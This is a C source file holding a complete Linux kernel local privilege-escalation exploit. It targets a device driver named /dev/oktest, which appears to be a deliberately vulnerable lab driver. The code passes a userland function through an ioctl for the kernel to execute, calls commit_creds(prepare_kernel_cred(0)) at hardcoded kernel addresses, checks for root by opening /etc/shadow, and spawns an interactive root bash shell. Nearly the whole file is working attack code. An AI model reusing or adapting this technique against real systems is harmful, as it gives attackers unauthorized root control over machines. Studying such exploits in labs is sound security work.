#define _GNU_SOURCE

#include <stdbool.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define DEVICE_NAME "oktest"
#define DEVICE_PATH "/dev/oktest"

#define MAGIC_NO '4'
static int count = 0;
static unsigned long commit_cred = 0xffffffffad0a4010;
//static void (*commit_cred)(void*) = (void (*)(void*))0xffffffffad0a4010;
static unsigned long prepare_kernel_cred = 0xffffffffad0a4510;
//static void *(*prepare_kernel_cred)(unsigned long) = (void *(*)(unsigned long))0xffffffffad0a4510;

/* 
 * Set the message of the device driver 
 */
#define OKTEST_EXEC _IOW(MAGIC_NO, 0, void(*)(void))

void func1(void) {
	count =+ 1;
}

typedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred); 
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);


void get_root_payload(void) {
	((_commit_creds)(commit_cred))(
		((_prepare_kernel_cred)(prepare_kernel_cred))(0)
	);
}
/*
void get_root_payload(void) {
	commit_cred(prepare_kernel_cred(0));
}
*/
void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

void fork_shell() {
	pid_t rv;

	rv = fork();
	if (rv == -1) {
		perror("[-] fork()");
		exit(EXIT_FAILURE);
	}

	if (rv == 0) {
		exec_shell();
	}
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

void check_root() {
	printf("[.] checking if we got root\n");

	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return;
	}

	printf("[+] got r00t ^_^\n");

	// Fork and exec instead of just doing the exec to avoid potential
	// memory corruptions when closing packet sockets.
	//fork_shell();
	exec_shell();
}


int main(int argc, char **argv)
{
	int fd;
	
	if((fd = open(DEVICE_PATH, O_RDWR)) == -1 ){
		printf("Failed to open (%s) errno (%d)\n", DEVICE_PATH, errno);
		return -1;
	}
	printf("Count is %d\n", count);
	printf("Calling OKTEST_EXEC to bypass SMEP/SMAP with func1\n");
	ioctl(fd, OKTEST_EXEC, func1);
	printf("Count is %d\n", count);
	
	printf("Calling OKTEST_EXEC to bypass SMEP/SMAP with get_root_payload\n");
	ioctl(fd, OKTEST_EXEC, get_root_payload);

	printf("OKTEST_EXEC done\n");

	check_root();


	return 0;
}

